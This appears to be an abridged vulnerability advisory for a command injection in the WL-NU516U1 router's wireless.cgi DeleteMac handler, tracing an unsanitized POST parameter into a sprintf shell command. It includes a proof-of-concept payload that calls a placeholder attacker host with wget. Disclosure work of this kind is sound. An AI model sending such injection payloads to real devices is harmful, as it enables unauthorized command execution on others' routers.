# WL-NU516U1 wireless.cgi DeleteMac b_delete_al_mac Command Injection
...
The function reads `b_delete_al_mac` from POST data via `sub_405EA8` and concatenates it into a shell command:
...
The `b_delete_al_mac` parameter is the 4th argument in the sprintf call (variable `v10`). No sanitization is applied.
...
ftext (main router)
  → sub_402D1C (DeleteMac handler)
    → sub_405EA8 (URL decode, reads b_delete_al_mac POST parameter)
...
1. User sends POST request with `page=DeleteMac&delete_list=AA&delete_al_mac=BB&b_delete_list=CC&b_delete_al_mac=$(wget http://attacker:6666/callback)`
2. `sub_402D1C` reads `b_delete_al_mac` → `$(wget http://attacker:6666/callback)`
3. No input filter is called (unlike GuestWifi handler)
4. sprintf constructs: `/etc/lighttpd/www/cgi-bin/del_mac.sh yAA yBB yCC y$(wget http://attacker:6666/callback) &`
...
The `b_delete_al_mac` parameter is the 4th argument in the sprintf call:
```c
sprintf(v20, "/etc/lighttpd/www/cgi-bin/del_mac.sh y%s y%s y%s y%s &", 
        v4,           // delete_list (1st)
        v6,           // delete_al_mac (2nd)
        v8,           // b_delete_list (3rd)
        v10);         // b_delete_al_mac (4th) ← THIS PARAMETER
```
...
**Verification:** Monitor receives `GET /b_al` from device IP, confirming command execution.

## Root Cause Summary

The root cause is:
1. No input sanitization or validation of the `b_delete_al_mac` parameter
